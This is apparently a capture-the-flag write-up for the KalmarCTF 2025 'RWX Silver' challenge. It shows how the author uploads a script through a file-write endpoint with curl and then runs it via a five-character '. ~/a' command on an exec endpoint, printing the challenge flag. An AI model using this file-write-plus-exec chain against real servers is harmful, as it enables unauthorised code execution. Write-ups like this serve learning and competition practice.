---
title: "RWX Silver"
description: "We give you file read, file write and code execution. But can you get the flag? Apparently that was too much!" 
pubDate: 2025-03-11
ctf: "KalmarCTF 2025"
category: "misc"
author: "sealldev"
section: "CTFs"
image: "images/25-kalmar/icon.png"
---

### Initial Look

We are supplied a `rwx-silver.zip`, which extracts to a `handout` folder.

The `app.py` and `would.c` are outlined in [RWX Bronze](25-kalmar-rwxbronze), but with a minor change:
```python
@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 5:
        return 'Command too long', 400
...
```

The `cmd` input can only be 5 characters this time, so we can't use `sh ~/a` to execute `~/a`.

### The shorter way

We can also use `.` as an alias for `source`, which is used to: "*load any functions file into the current shell script or a command prompt.*": [Source](https://bash.cyberciti.biz/guide/Source_command)

We can supply bash scripts to source and execute their contents like so:
```bash
$ echo "#!/bin/bash" > script.sh
$ echo "whoami" >> script.sh
$ . ./script.sh
user
```

### Repeating the exploit

Now (using the same exploit from bronze):

I make a new script to execute `would`:
```bash
#!/bin/sh
/would you be so kind to provide me with a flag
```

I upload it to `/home/user/a`

```bash
$ curl -X POST "https://<instance>.inst2.chal-kalmarc.tf/write?filename=/home/user/a" -T test.sh
OK
```

Then I execute it with `.`:
```bash
$ curl "https://<instance>.inst2.chal-kalmarc.tf/exec?cmd=.%20~/a"
kalmar{impressive_that_you_managed_to_get_this_far_but_surely_silver_is_where_your_rwx_adventure_ends_b4284b024113}
```

Flag: `kalmar{impressive_that_you_managed_to_get_this_far_but_surely_silver_is_where_your_rwx_adventure_ends_b4284b024113}`